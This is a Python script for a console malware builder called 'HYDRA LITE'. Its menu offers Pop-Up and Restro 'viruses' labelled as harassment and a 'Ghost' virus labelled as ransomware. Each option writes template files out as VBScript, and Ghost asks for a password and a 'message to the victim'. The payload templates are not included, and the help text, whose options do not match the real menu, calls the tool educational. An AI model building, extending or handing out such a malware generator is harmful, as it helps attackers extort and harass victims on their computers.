from itertools import cycle
import os
import shutil
import subprocess
import time
from colorama import Fore
import win32api
from itertools import cycle
from threading import Thread
from time import sleep
from sys import stdout as terminal

done = False

def animate():
    for c in cycle([Fore.LIGHTYELLOW_EX +'|',Fore.LIGHTYELLOW_EX + '/',Fore.LIGHTYELLOW_EX + '-',Fore.LIGHTYELLOW_EX + '\\']):
        if done:
            break
        terminal.write(Fore.LIGHTGREEN_EX + '\rloading ' + c)
        terminal.flush()
        sleep(0.1)
    terminal.flush()

t = Thread(target=animate)
t.start()
sleep(3)
done = True


os.system('cls' if os.name == 'nt' else 'clear')

print(Fore.LIGHTYELLOW_EX + "    V1" , Fore.GREEN + '''
   @@%                %@@
   *@%*_++++++++++++_*%@*
    @##      /\      ##@
    *@*   /\ %% /\    @*
    #@    #  %%  #    %%         %@              @@      **+         *#%+#*
    %#    @  %%  @    *@   @@    %@     *%*      @@     *@@%#*@      *@   @%*            %%
    %%    @  %%  @    #@   @@     @     *%*     #%      @@@    %@    *@    %*          @@@@
     @    @  %%  @    @    @@     @      +*@%  %%       @%     #@    *@    #*         @   @
      #    \@@##/   @*     %####@#@@++     %@@@        *@#    #@     *@@@@%@        @@@##%@%
       *%    %%    %#     #@     @#          @@         %@    @%     *@@*   %@      @*   *@
         %%  %%  #@       #@     @#          @@         @@@#*         *@      %@   %*     @
          @  %%  @*              #           @@                       *@        
          *@@@@@@*                                                    *%          
          *@@@@@@*                                                    *%
          *@@@@@@*                                                     %            
           #@@@@#                                                       
            +##+                                                                          LITE
''')

def show_menu():
    print("                                                  ")
    print(Fore.LIGHTYELLOW_EX + "BY ABD125141")
    print("                             ")
    print(Fore.LIGHTRED_EX + " ID",Fore.LIGHTYELLOW_EX   + "            VIRES NAME" , Fore.LIGHTCYAN_EX +   "                   RISK" , Fore.LIGHTMAGENTA_EX + "                 GOUL")
    print(Fore.GREEN + "----------------------------------------------------------------------------------")
    print(Fore.RED + "[ 1 ]", Fore.LIGHTYELLOW_EX + "    Pop-Up",Fore.GREEN + "                             LOW ", Fore.GREEN + "                 HARASSMENT")
    print(Fore.RED + "[ 2 ]", Fore.LIGHTYELLOW_EX + "    Ghost", Fore.LIGHTRED_EX + "                              HIGHT", Fore.LIGHTRED_EX + "                RANSOMWARE")
    print(Fore.RED + "[ 3 ]", Fore.LIGHTYELLOW_EX + "    Restro", Fore.YELLOW + "                             MEDIUM", Fore.GREEN + "               HARASSMENT")
    print(Fore.RED + "[ h ]", Fore.LIGHTYELLOW_EX + "    HELP")
    print(Fore.RED + "[ c ]", Fore.LIGHTYELLOW_EX + "    Contact US for a problem")
    print(Fore.RED + "[ 0 ]", Fore.LIGHTYELLOW_EX + "    EXIT")
    print(Fore.LIGHTGREEN_EX + "-----------------------------------------------------------------------------------")
    print()


def modify_code_and_save_as_vbs(file_path, ip_address, port):
    with open(file_path, 'r', encoding='utf-8') as file:
        code = file.read()

    # استبدال النصوص في الكود المدخل
    modified_code = code.replace('massagetitle', ip_address).replace('massagecontent', str(port))

    # تحديد مسار حفظ الملف المعدل بصيغة VBS
    vbs_file_path = os.path.join('output', 'FILES', os.path.basename(file_path).replace('.txt', '.vbs'))
    os.makedirs(os.path.dirname(vbs_file_path), exist_ok=True)

    # حفظ الملف المعدل بصيغة VBS
    with open(vbs_file_path, 'w', encoding='utf-8') as file:
        file.write(modified_code)

    print(Fore.LIGHTGREEN_EX + f"File '{os.path.basename(file_path)}' has been modified and saved as '{os.path.basename(vbs_file_path)}' successfully.")

def copy_and_save_as_vbs(file_path):
    # تحديد مسار حفظ الملف كما هو بصيغة VBS
    vbs_file_path = os.path.join('output', 'FILES', os.path.basename(file_path).replace('.txt', '.vbs'))
    os.makedirs(os.path.dirname(vbs_file_path), exist_ok=True)

    # نسخ محتوى الملف كما هو وحفظه بصيغة VBS
    shutil.copy(file_path, vbs_file_path)
    print(Fore.LIGHTGREEN_EX + f"File '{os.path.basename(file_path)}' has been copied and saved as '{os.path.basename(vbs_file_path)}' successfully.")



def main():
    while True:
        show_menu()
        choice = input(Fore.LIGHTWHITE_EX + "WDYW: ")
        print("      ")
        print(Fore.LIGHTRED_EX+"KEEP HACkING...")
        print("     ")
        time.sleep(1)

       
            
 
        ####################################################################### POPUP ##################################################################################################

        if choice == '1':
            icon_path = 4
            print("    ")
            time.sleep(1)
            print(Fore.YELLOW + "We prepare everything for you, relax...")
            time.sleep(5)

            # مسار ملف الـ txt والـ vbs
            client_code_path = os.path.join('FILES', 'popup.txt')
            vbs_code_path = os.path.join('output', 'FILES', 'popup.vbs')

            try:
                # نسخ محتويات ملف الـ txt وحفظه في ملف الـ vbs
                shutil.copy(client_code_path, vbs_code_path)
                print(Fore.GREEN + "TXT File has been copied and saved as VBS successfully.")
            except Exception as e:
                print(Fore.RED + "Failed to copy TXT file as VBS:", str(e))

        
            print(Fore.GREEN + "VBS File has been created and saved successfully.") 
            print(Fore.LIGHTGREEN_EX + "popup has been created and saved as popup.vbs successfully.")
            print() 


            ########################################################################################## GHOST #######################################################################################################################

        elif choice == '2':
            ip_address = input(Fore.LIGHTMAGENTA_EX + "Password (16 characters): ")
            port = input(Fore.LIGHTGREEN_EX + "Enter your message to the victim: ")

            print(Fore.YELLOW + "We prepare everything for you, relax...")
            time.sleep(5)

            # تعديل ملف ghost.txt وحفظه كملف VBS
            client_code_path = os.path.join('FILES', 'ghost.txt')
            modify_code_and_save_as_vbs(client_code_path, ip_address, port)

            # حفظ ملف ghost_s.txt كما هو بصيغة VBS
            server_code_path = os.path.join('FILES', 'ghost_s.txt')
            copy_and_save_as_vbs(server_code_path)

            print(Fore.LIGHTGREEN_EX + "GHOST Virus has been created successfully as VBS files.")
            print() 
           


######################################################################################### RESTRO ########################################################################################



        elif choice == '3':
            icon_path = 4
            print("    ")
            time.sleep(1)
            print(Fore.YELLOW + "We prepare everything for you, relax...")
            time.sleep(5)

            # مسار ملف الـ txt والـ vbs
            client_code_path = os.path.join('FILES', 'Restro.txt')
            vbs_code_path = os.path.join('output', 'FILES', 'Restro.vbs')

            try:
                # نسخ محتويات ملف الـ txt وحفظه في ملف الـ vbs
                shutil.copy(client_code_path, vbs_code_path)
                print(Fore.GREEN + "TXT File has been copied and saved as VBS successfully.")
            except Exception as e:
                print(Fore.RED + "Failed to copy TXT file as VBS:", str(e))

        
            print(Fore.GREEN + "VBS File has been created and saved successfully.") 
            print(Fore.LIGHTGREEN_EX + "virus Created Successfully")
            print() 


##############################################################################################################################################################################################################################################


# الخيار رقم 6 - HELP
        elif choice == 'h':
            print(Fore.LIGHTBLUE_EX + "HELP:")
            print(Fore.LIGHTWHITE_EX + "-----")
            print(Fore.LIGHTRED_EX + "This program is designed for educational purposes only. It provides a menu of different Viruses and tools that can be used for security testing and awareness.")
            print(Fore.LIGHTRED_EX + "Each option corresponds to a different type of Viruses or tool.")
            print()
            print(Fore.LIGHTMAGENTA_EX + "Options:")
            print(Fore.LIGHTYELLOW_EX + "1. Windows Screen Scam virus: Creates a virus that simulates a screen scam on a Windows system.")
            print(Fore.LIGHTYELLOW_EX + "2. Bad USB: Generates a virus for a USB device that may act in a malicious way when connected to a computer.")
            print(Fore.LIGHTYELLOW_EX + "3. Pop-Up: Creates a simple pop-up virus.")
            print(Fore.LIGHTYELLOW_EX + "4. Ghost: Generates a virus that may act as ransomware.")
            print(Fore.LIGHTYELLOW_EX + "5. Restro: Creates a virus that may cause harassment.")
            print(Fore.LIGHTYELLOW_EX + "6. HELP: Displays this help message.")
            print(Fore.LIGHTYELLOW_EX + "7. Contact US for a problem: Provides contact information for support.")
            print(Fore.LIGHTYELLOW_EX + "0. EXIT: Exits the program.")
            print()
            print(Fore.LIGHTMAGENTA_EX + "Instructions:")
            print(Fore.GREEN + "1. Select the desired option by entering the corresponding number.")
            print(Fore.LIGHTCYAN_EX + "2. Follow the prompts to provide necessary information for the virus.")
            print(Fore.LIGHTGREEN_EX + "3. Wait for the program to prepare the virus.")
            print(Fore.CYAN + "4. The generated virus will be saved in the 'output' and 'dist' folder.")
            print(Fore.LIGHTRED_EX + "5. Use the generated viruses responsibly and only in controlled environments.")
            print(Fore.YELLOW + "6. The program will keep running until you choose to exit (option 0).")
            print()


        elif choice == 'c':
            print(Fore.MAGENTA + "-------------------------------------------------")
            print(Fore.YELLOW + "Contact US for a problem at [nextwebae@gmail.com]")
            print(Fore.MAGENTA + "-------------------------------------------------")


        elif choice == '0':
         break
        

        else:
            print(Fore.RED + "Invalid choice. Please select again.")

            

    print(Fore.BLUE + "@",Fore.LIGHTWHITE_EX + "HYDRA will miss you :(",Fore.BLUE + "@" , Fore.LIGHTGREEN_EX + " HYDRA©" , Fore.LIGHTYELLOW_EX + "Created by ABooD125141"  )
    print(Fore.BLUE + "_________________________")
    print("                     ")
    print(Fore.YELLOW + "hAcK tHe WoRLd ")
    print("                     ")
    print()

if __name__ == "__main__":
    main()
    time.sleep(3)